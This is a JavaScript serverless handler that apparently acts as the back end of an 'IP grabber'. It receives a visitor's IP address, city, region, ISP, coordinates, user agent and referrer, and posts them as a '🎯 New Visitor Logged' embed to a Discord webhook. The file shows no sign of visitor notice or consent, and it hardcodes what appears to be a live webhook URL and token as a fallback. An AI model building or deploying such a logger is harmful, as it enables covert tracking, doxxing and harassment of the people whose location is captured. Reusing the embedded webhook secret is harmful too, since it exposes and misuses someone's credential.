export default async function handler(req, res) {
  if (req.method !== 'POST') return res.status(405).end();

  const { ip, geo, userAgent, referrer, timestamp } = req.body;
  
  // Replace with your actual Discord webhook URL
  const WEBHOOK_URL = process.env.DISCORD_WEBHOOK || 'https://discord.com/api/webhooks/1561539234253377577/bKQR9S72zcWCwG3h_bLZJcPTDRKonLDZl-BTbtdiEAVdN4cTapLTGdvYYiuLv3BwSL2n';

  const embed = {
    title: "🎯 New Visitor Logged",
    color: 0xff0000,
    timestamp: new Date().toISOString(),
    fields: [
      { name: "IP Address", value: `\`${ip}\``, inline: true },
      { name: "Country", value: geo?.country_name || 'Unknown', inline: true },
      { name: "City", value: geo?.city || 'Unknown', inline: true },
      { name: "Region", value: geo?.region || 'Unknown', inline: true },
      { name: "ISP", value: geo?.org || 'Unknown', inline: true },
      { name: "Coordinates", value: geo?.latitude ? `${geo.latitude}, ${geo.longitude}` : 'Unknown', inline: true },
      { name: "User Agent", value: `\`\`\`${userAgent?.slice(0, 1000)}\`\`\``, inline: false },
      { name: "Referrer", value: referrer || 'Direct', inline: false }
    ],
    footer: { text: "Logger v1.0" }
  };

  try {
    await fetch(WEBHOOK_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ embeds: [embed] })
    });
    res.status(200).json({ success: true });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
}
